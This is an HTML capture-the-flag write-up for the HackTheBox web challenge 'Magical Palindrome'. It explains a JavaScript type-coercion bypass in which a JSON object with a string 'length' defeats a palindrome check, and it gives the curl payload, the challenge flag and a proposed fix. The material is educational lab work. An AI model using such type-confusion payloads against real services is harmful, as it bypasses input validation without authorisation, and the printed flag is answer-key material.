@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Magical Palindrome | HTB | CTF Writeups</title>
+    <meta name="description" content="Writeup for Magical Palindrome web challenge from HackTheBox - JavaScript Type Coercion exploit">
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'></text></svg>">
+</head>
+<body>
+    <nav>
+        <div class="container">
+            <a href="../index.html" class="logo"><span class="logo-icon"></span><span>CTF Writeups</span></a>
+            <div class="nav-toggle" onclick="toggleNav()"><span></span><span></span><span></span></div>
+            <ul id="nav-menu">
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../writeups.html">Writeups</a></li>
+                <li><a href="../cves.html">CVEs</a></li>
+                <li><a href="../about.html">About</a></li>
+                <li><a href="https://github.com/walidzitouni/CTFWriteups" target="_blank">GitHub</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="breadcrumbs">
+        <div class="container">
+            <a href="../index.html">Home</a><span>/</span>
+            <a href="../writeups.html">Writeups</a><span>/</span>
+            <span style="color: var(--primary-purple);">Magical Palindrome</span>
+        </div>
+    </div>
+
+    <article class="writeup-content">
+        <header>
+            <div class="writeup-tags" style="margin-bottom: 1rem;">
+                <span class="tag">Web</span>
+                <span class="tag">Type Coercion</span>
+                <span class="tag">JavaScript</span>
+                <span class="tag difficulty-easy">Very Easy</span>
+            </div>
+            <h1>Magical Palindrome</h1>
+            <div class="writeup-meta" style="margin-bottom: 2rem; color: var(--text-muted);">
+                <span>2025</span>
+                <span style="margin: 0 1rem;">|</span>
+                <span>HackTheBox</span>
+                <span style="margin: 0 1rem;">|</span>
+                <span>Web Exploitation</span>
+            </div>
+        </header>
+
+        <h2>Challenge Description</h2>
+        <blockquote>In Dumbledore's absence, Harry's memory fades, leaving crucial words lost. Delve into the arcane world, harness the power of JSON, and unveil the hidden spell to restore his recollection. Can you help harry to find path to salvation?</blockquote>
+
+        <h2>Initial Analysis</h2>
+        <h3>Examining the Source Code</h3>
+        <p>The challenge provides several configuration files. The key files are:</p>
+
+        <p><strong>index.mjs</strong> - Main server logic:</p>
+        <pre><code>const IsPalinDrome = (string) => {
+    if (string.length < 1000) {
+        return 'Tootus Shortus';
+    }
+
+    for (const i of Array(string.length).keys()) {
+        const original = string[i];
+        const reverse = string[string.length - i - 1];
+
+        if (original !== reverse || typeof original !== 'string') {
+            return 'Notter Palindromer!!';
+        }
+    }
+
+    return null;
+}
+
+app.post('/', async (c) => {
+    const {palindrome} = await c.req.json();
+    const error = IsPalinDrome(palindrome);
+    if (error) {
+        c.status(400);
+        return c.text(error);
+    }
+    return c.text(`Hii Harry!!! ${flag}`);
+});</code></pre>
+
+        <p><strong>nginx.conf</strong> - Server configuration:</p>
+        <pre><code>server {
+    listen 80;
+    server_name 127.0.0.1;
+    client_max_body_size 75;  // Only 75 BYTES allowed!
+
+    location / {
+        proxy_pass http://127.0.0.1:3000;
+        proxy_read_timeout 5s;
+    }
+}</code></pre>
+
+        <h3>The Challenge</h3>
+        <p>We need to:</p>
+        <ol>
+            <li>Send a palindrome with <code>length >= 1000</code></li>
+            <li>Keep the request body under 75 bytes</li>
+            <li>Pass the palindrome validation check</li>
+        </ol>
+        <p>At first glance, this seems impossible - a JSON payload with 1000 characters would be over 1000 bytes!</p>
+
+        <h2>Failed Attempts</h2>
+
+        <h3>Attempt 1: Direct String (Too Large)</h3>
+        <pre><code>curl -X POST http://target:port \
+  -H "Content-Type: application/json" \
+  -d '{"palindrome":"'"$(python3 -c 'print("a"*1000)')"'"}'</code></pre>
+        <p><strong>Result:</strong> <code>413 Request Entity Too Large</code> - Payload ~1018 bytes exceeds nginx's 75-byte limit</p>
+
+        <h3>Attempt 2: GZIP Compression</h3>
+        <p><strong>Result:</strong> <code>Internal Server Error</code> - Hono framework doesn't automatically decompress gzip-encoded requests</p>
+
+        <h3>Attempt 3: Transfer-Encoding: Chunked</h3>
+        <p><strong>Result:</strong> <code>413 Request Entity Too Large</code> - nginx still enforces <code>client_max_body_size</code> on chunked requests</p>
+
+        <h2>The Vulnerability</h2>
+        <h3>JavaScript Type Coercion Bug</h3>
+        <p>The vulnerability lies in how JavaScript handles the <code>Array()</code> constructor with different data types.</p>
+
+        <p><strong>Key Observations:</strong></p>
+        <ol>
+            <li>When <code>string.length</code> is a <strong>NUMBER</strong> (e.g., <code>1000</code>):
+                <pre><code>Array(1000).keys()  // Creates iterator with 1000 values: 0, 1, 2, ..., 999</code></pre>
+            </li>
+            <li>When <code>string.length</code> is a <strong>STRING</strong> (e.g., <code>"1000"</code>):
+                <pre><code>Array("1000").keys()  // Creates array ["1000"] with ONE element!
+// Iterator yields only: 0</code></pre>
+            </li>
+        </ol>
+
+        <h3>The Exploit</h3>
+        <p>By sending an object with:</p>
+        <ul>
+            <li><code>length</code> as a <strong>string</strong> <code>"1000"</code> (not a number)</li>
+            <li>Properties at indices <code>0</code> and <code>999</code></li>
+        </ul>
+
+        <p>We can:</p>
+        <ol>
+            <li><strong>Pass the length check:</strong> <code>"1000" < 1000</code> - JavaScript coerces the string to number - <code>1000 < 1000</code> - <code>false</code></li>
+            <li><strong>Minimize loop iterations:</strong> <code>Array("1000")</code> creates an array with only ONE element, so the loop runs only ONCE</li>
+            <li><strong>Pass the palindrome check:</strong> The single iteration only checks <code>string[0]</code> vs <code>string[999]</code>, both set to <code>"a"</code></li>
+        </ol>
+
+        <h2>The Solution</h2>
+        <h3>Exploit Payload</h3>
+        <pre><code>{"palindrome":{"0":"a","999":"a","length":"1000"}}</code></pre>
+        <p><strong>Payload size:</strong> 50 bytes (well under the 75-byte limit!)</p>
+
+        <h3>Execution Flow</h3>
+        <pre><code>// Step 1: Length check
+"1000" < 1000  // String coerced to number: 1000 < 1000 = false
+
+// Step 2: Create array
+Array("1000")  // Creates ["1000"] - array with ONE element
+
+// Step 3: Loop iteration
+for (const i of Array("1000").keys()) {  // Yields only: i=0
+    const original = string[0];      // = "a"
+    const reverse = string["1000" - 0 - 1];  // = string[999] = "a"
+
+    if ("a" !== "a" || typeof "a" !== 'string') {  // false || false = false
+        return 'Notter Palindromer!!';
+    }
+}
+
+// Step 4: Success!
+return null;  // Returns flag</code></pre>
+
+        <h3>Final Command</h3>
+        <pre><code>curl -X POST http://target:port \
+  -H "Content-Type: application/json" \
+  -d '{"palindrome":{"0":"a","999":"a","length":"1000"}}'</code></pre>
+
+        <h3>Result</h3>
+        <pre><code>Hii Harry!!! HTB{Lum0s_M@x!ma}</code></pre>
+
+        <h2>Key Takeaways</h2>
+        <ul>
+            <li><strong>Type Coercion Vulnerabilities:</strong> JavaScript's automatic type coercion can lead to unexpected behavior</li>
+            <li><strong>Array Constructor Behavior:</strong> <code>Array(n)</code> behaves differently when <code>n</code> is a number vs. a string</li>
+            <li><strong>Input Validation:</strong> Always validate not just the value but also the <strong>type</strong> of user inputs</li>
+            <li><strong>Defense:</strong> Use strict equality (<code>===</code>) and type checking, especially when dealing with user-controlled data</li>
+        </ul>
+
+        <h3>Proper Fix</h3>
+        <pre><code>const IsPalinDrome = (string) => {
+    // Validate input type
+    if (typeof string !== 'string') {
+        return 'Invalid input type';
+    }
+
+    // Ensure length is a number
+    if (typeof string.length !== 'number' || string.length < 1000) {
+        return 'Tootus Shortus';
+    }
+
+    // ... rest of validation
+}</code></pre>
+
+        <h2>Flag</h2>
+        <div class="flag-box">
+            <div class="flag-label">Flag</div>
+            <div class="flag-value">HTB{Lum0s_M@x!ma}</div>
+        </div>
+
+        <div style="margin-top: 3rem; padding-top: 2rem; border-top: 1px solid rgba(155, 89, 182, 0.3);">
+            <a href="../writeups.html" class="btn btn-secondary">Back to Writeups</a>
+        </div>
+    </article>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand"><a href="../index.html" class="logo"><span class="logo-icon"></span><span>CTF Writeups</span></a></div>
+                <div class="footer-links"><a href="../index.html">Home</a><a href="../writeups.html">Writeups</a><a href="../cves.html">CVEs</a><a href="../about.html">About</a></div>
+            </div>
+        </div>
+    </footer>
+    <script>function toggleNav() { document.getElementById('nav-menu').classList.toggle('active'); }</script>
+</body>
+</html>
